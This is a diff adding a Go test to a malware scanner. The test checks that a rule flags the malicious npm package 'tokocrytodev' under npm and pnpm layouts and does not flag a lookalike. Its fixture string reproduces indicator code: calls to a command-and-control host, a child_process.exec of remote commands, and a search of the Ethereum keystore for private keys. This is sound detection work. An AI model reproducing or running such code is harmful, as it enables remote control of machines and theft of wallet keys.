@@ -654,6 +654,54 @@ func TestScan_AmazonInspectorSimpleDateFormatterUnderNodeModules(t *testing.T) {
 	}
 }
 
+// TestScan_AmazonInspectorTokocrytodevUnderNodeModules proves the bounded
+// walker reaches the reviewed remote-command and private-key theft source in
+// npm and pnpm layouts without scanning a lookalike package.
+func TestScan_AmazonInspectorTokocrytodevUnderNodeModules(t *testing.T) {
+	raw := []byte(`const c2 = "https://badai.run.place"; fetch(c2 + "/cekapppiapi.php?uid=" + uid); child_process.exec(command); fetch(c2 + "/fallback.php", { method: "POST" }); find("$HOME/.ethereum/keystore", "PRIVATE KEY");`)
+	layouts := []struct {
+		name string
+		rel  string
+	}{
+		{"npm", filepath.Join("node_modules", "tokocrytodev", "index.js")},
+		{"pnpm", filepath.Join("node_modules", ".pnpm", "tokocrytodev@1.0.0", "node_modules", "tokocrytodev", "index.js")},
+	}
+	for _, layout := range layouts {
+		t.Run(layout.name, func(t *testing.T) {
+			root := t.TempDir()
+			payload := filepath.Join(root, layout.rel)
+			if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(payload, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			lookalike := filepath.Join(root, "node_modules", "other-package", "index.js")
+			if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(lookalike, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
+			if err != nil {
+				t.Fatalf("scan: %v", err)
+			}
+			got := 0
+			for _, f := range res.Findings {
+				if f.RuleID == "amazon-inspector-npm-malware-ioc" {
+					got++
+				}
+			}
+			if got != 1 {
+				t.Fatalf("amazon-inspector-npm-malware-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
+			}
+		})
+	}
+}
+
 // TestScan_AmazonInspectorNPMMalwareFollowupUnderNodeModules proves the
 // bounded walker reaches the campaign's reviewed follow-up persistence files
 // in npm and pnpm layouts without broad-scanning unrelated package roots.
